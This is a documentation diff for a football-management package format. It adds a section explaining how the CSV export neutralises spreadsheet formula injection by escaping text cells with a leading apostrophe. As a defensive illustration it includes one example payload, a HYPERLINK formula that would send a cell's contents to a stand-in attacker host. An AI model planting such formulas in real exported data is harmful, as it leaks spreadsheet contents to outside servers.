@@ -250,6 +250,16 @@ Use it to bulk-edit in a spreadsheet, to diff two versions of a package, or as a
 
 Team names, cities, and stadium names are free text, so values containing commas or quotes are quoted properly — a club called `Preston North End, Lancashire` round-trips intact.
 
+**Formula escaping:**
+
+Spreadsheets execute any cell whose text starts with `=`, `+`, `-` or `@`. Because a package's text can come from a package someone else authored, a name like `=HYPERLINK("http://evil.example/?x="&A1,"FC")` would stop being a name and become a live formula as soon as the file was opened. `.ofm` is a data format — installing a package must never run anything — so the export neutralises those cells.
+
+- A **text** cell that would be read as a formula is written with a leading apostrophe, which spreadsheets consume as a "treat this as text" marker. `=1+1` is written as `'=1+1` and displays as `=1+1`.
+- **Numeric columns are never escaped.** `financeMin`, `financeMax`, `reputationMin`, `reputationMax`, `age`, `overall` and the 19 attribute columns stay plain numbers, so a club in debt exports `-2000000` and remains sortable and summable.
+- The escape is **reversible**. It is applied when the cell — ignoring any leading apostrophes — starts with one of the four characters, so a name the author really did write as `'=x` becomes `''=x`. To undo it, drop exactly one leading apostrophe when the remaining text starts with `=`, `+`, `-` or `@`; leave every other cell alone. A name like `'tis` is untouched in both directions.
+
+If you edit the CSV in a spreadsheet and save it back, the apostrophe is usually dropped again on write — that is expected, and a reader must accept both the escaped and unescaped spelling of the same value.
+
 ---
 
 ## Save, Validate, and Build
